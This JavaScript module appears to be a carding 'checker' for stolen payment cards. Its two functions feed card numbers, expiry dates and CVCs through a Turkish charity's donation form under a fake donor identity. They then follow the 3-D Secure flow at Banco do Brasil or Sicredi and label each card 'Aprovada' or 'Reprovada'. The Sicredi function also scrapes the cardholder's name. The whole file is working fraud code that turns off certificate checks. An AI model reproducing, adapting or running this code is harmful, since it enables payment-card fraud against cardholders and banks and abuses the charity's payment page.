import got from "got";
import {
    load
} from "cheerio";
import {
    CookieJar
} from "tough-cookie";

export async function checker_bb(card_params) {
    if (card_params.substring(0, 1) != '4' && card_params.substring(0, 1) != '5') {
        return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ incompatible card</font>`;
    }
    if (card_params.substring(0, 1) == '4') {
        var c_url = 'www58.bb.com.br';
        var secureUrl = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin';
    }
    if (card_params.substring(0, 1) == '5') {
        var c_url = 'www66.bb.com.br';
        var secureUrl = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin';
    }

    //split with multiple separators -> |,.:;/
    const split_card = card_params.split(/[\s|,.:;/]+/);

    //new card with +
    const new_card = `${split_card[0].substring(0,4)}+${split_card[0].substring(4,8)}+${split_card[0].substring(8,12)}+${split_card[0].substring(12,16)}`;

    const cookieJar = new CookieJar();
    const client = got.extend({
        cookieJar
    });

    try {
        const req = await got.post('https://www.ihyavakfi.org.tr/bagis/bagis-yap/', {
            headers: {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'pt-BR,pt;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'csrftoken=YHeC75kzINFx5GTEhk19HnyWQ4QdaZpE0e54bAZgi04l4ZOfx0syJIxhSjqfpwR5',
                'origin': 'https://www.ihyavakfi.org.tr',
                'referer': 'https://www.ihyavakfi.org.tr/bagis/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
            },
            body: `csrfmiddlewaretoken=K0d67TTL9J6j4kApvnD9uug1J6DmZtjWMx4yboysJWv73Dv0L34ywPfmLldoe0Ln&isim=CARLA+LIMA&email=adeoralimao%40gmail.com&telefon=2129818282&mesaj=&number=${new_card}&card_name=CARLA+LIMA&expiry=${split_card[1]}+%2F+${split_card[2].substring(2)}&cvc=${split_card[3]}&tutar=50&bagis_tip=serbest`,
            https: {
                rejectUnauthorized: false
            },
            responseType: 'text',
            resolveBodyOnly: true
        });

        const html = load(req);
        const value_pareq = html('[name="PaReq"]').attr('value');
        const value_md = html('[name="MD"]').attr('value');
        const value_termurl = html('[name="TermUrl"]').attr('value');

        if (value_pareq == undefined || value_md == undefined || value_termurl == undefined) {
            console.log('sem tokens pareq')
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ empty tokens</font>`;
        }

        const req_two = await client.post(`${secureUrl}/inicio.bb`, {
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'pt-BR,pt;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
            },
            body: `_charset_=UTF-8&TermUrl=${encodeURIComponent(value_termurl)}&PaReq=${encodeURIComponent(value_pareq)}&MD=${encodeURIComponent(value_md)}`,
            https: {
                rejectUnauthorized: false
            },
            responseType: 'text',
            resolveBodyOnly: true
        });

        if (req_two.includes('Abra o aplicativo do BB em seu smartphone') == true) {
            return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ QR-CODE</font>`;
        }
        if (req_two.includes('Ocorreu um erro durante o processamento de sua') == true) {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ authentication error</font>`;
        } else {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ card declined</font>`;
        }
    } catch (error) {
        if (error.code == 'ERR_NON_2XX_3XX_RESPONSE') {
            const req_tree = await client(`${secureUrl}/customer.bb`, {
                headers: {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Language': 'pt-BR,pt;q=0.9',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
                },
                https: {
                    rejectUnauthorized: false
                },
                responseType: 'text',
                resolveBodyOnly: true
            });

            if (req_tree.includes('Prezado cliente, voc&ecirc; n&atilde;o possui o M&oacute') == true) {
                return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ CLEAN</font>`;
            }
            if (req_tree.includes('Selecione um celular para receber') == true) {
                return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ SMS</font>`;
            } else {
                return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ card declined</font>`;
            }
        } else {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ API ➜ request failed</font>`;
        }
    }
}

export async function checker_sicredi(card_params) {
    if (card_params.substring(0, 1) != '4' && card_params.substring(0, 1) != '5') {
        return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ incompatible card</font>`;
    }
    if (card_params.substring(0, 1) == '4') {
        var c_url = 'verifiedbyvisa.secureacs.com';
    }
    if (card_params.substring(0, 1) == '5') {
        var c_url = 'mastercardsecurecode.secureacs.com';
    }

    //split with multiple separators -> |,.:;/
    const split_card = card_params.split(/[\s|,.:;/]+/);

    //new card with +
    const new_card = `${split_card[0].substring(0,4)}+${split_card[0].substring(4,8)}+${split_card[0].substring(8,12)}+${split_card[0].substring(12,16)}`;

    const cookieJar = new CookieJar();
    const client = got.extend({
        cookieJar
    });

    try {
        const req = await got.post('https://www.ihyavakfi.org.tr/bagis/bagis-yap/', {
            headers: {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'pt-BR,pt;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'csrftoken=YHeC75kzINFx5GTEhk19HnyWQ4QdaZpE0e54bAZgi04l4ZOfx0syJIxhSjqfpwR5',
                'origin': 'https://www.ihyavakfi.org.tr',
                'referer': 'https://www.ihyavakfi.org.tr/bagis/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
            },
            body: `csrfmiddlewaretoken=K0d67TTL9J6j4kApvnD9uug1J6DmZtjWMx4yboysJWv73Dv0L34ywPfmLldoe0Ln&isim=CARLA+LIMA&email=adeoralimao%40gmail.com&telefon=2129818282&mesaj=&number=${new_card}&card_name=CARLA+LIMA&expiry=${split_card[1]}+%2F+${split_card[2].substring(2)}&cvc=${split_card[3]}&tutar=50&bagis_tip=serbest`,
            https: {
                rejectUnauthorized: false
            },
            responseType: 'text',
            resolveBodyOnly: true
        });

        const html = load(req);
        const value_url = html('[name="downloadForm"]').attr('action');
        const value_pareq = html('[name="PaReq"]').attr('value');
        const value_md = html('[name="MD"]').attr('value');
        const value_termurl = html('[name="TermUrl"]').attr('value');

        if (value_pareq == undefined || value_md == undefined || value_termurl == undefined) {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ empty tokens</font>`;
        }

        const req_two = await client.post(value_url, {
            headers: {
                'Host': c_url,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.gov.org.tr',
                'Connection': 'keep-alive',
                'Referer': 'https://www.gov.org.tr/'
            },
            body: `PaReq=${encodeURIComponent(value_pareq)}&TermUrl=${encodeURIComponent(value_termurl)}&MD=${encodeURIComponent(value_md)}`,
            https: {
                rejectUnauthorized: false
            },
            responseType: 'text',
            resolveBodyOnly: true
        });

        const html2 = load(req_two);
        const redirect = html2('[name="redirectForm"]').attr('action');
        const IdSession = html2('[name="IdSession"]').attr('value');
        const UrlReturn = html2('[name="UrlReturn"]').attr('value');
        const TokenWeb = html2('[name="TokenWeb"]').attr('value');
        const TokenWebReturn = html2('[name="TokenWebReturn"]').attr('value');

        if (IdSession == undefined || UrlReturn == undefined || TokenWeb == undefined || TokenWebReturn == undefined) {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ empty tokens</font>`;
        }

        const req_tree = await client.post(redirect, {
            headers: {
                'Host': c_url,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': `https://${c_url}`,
                'Connection': 'keep-alive',
                'Referer': `https://${c_url}/AcsPreAuthenticationWEB/PreAuthenticationServlet`,
            },
            body: `IdSession=${encodeURIComponent(IdSession)}&UrlReturn=${encodeURIComponent(UrlReturn)}&TokenWeb=${encodeURIComponent(TokenWeb)}&TokenWebReturn=${encodeURIComponent(TokenWebReturn)}`,
            https: {
                rejectUnauthorized: false
            },
            responseType: 'text',
        });

        const req_for = await client(`https://${c_url}/AuthSystemSicrediWEB/pages/authentication.jsf`, {
            headers: {
                'Host': c_url,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
                'Referer': `https://${c_url}/AcsPreAuthenticationWEB/PreAuthenticationServlet`,
                'Connection': 'keep-alive',
            },
            https: {
                rejectUnauthorized: false
            },
            responseType: 'text',
            resolveBodyOnly: true
        });

        const html3 = load(req_for);
        const nome_client = html3('[class="hst_bank_body_1_font"]').text().split('.')[0].trim().replace('Olá ', '');

        if (JSON.stringify(req_for).includes('hst_bank_body_1_font') == true) {
            return `<font style="color: green;">#Aprovada ${card_params} ➜ ${nome_client} ➜ authorized</font>`;
        } else {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ card declined</font>`;
        }
    } catch (error) {
        return `<font style="color: red;">#Reprovada ${card_params} ➜ API ➜ request failed</font>`;
    }
}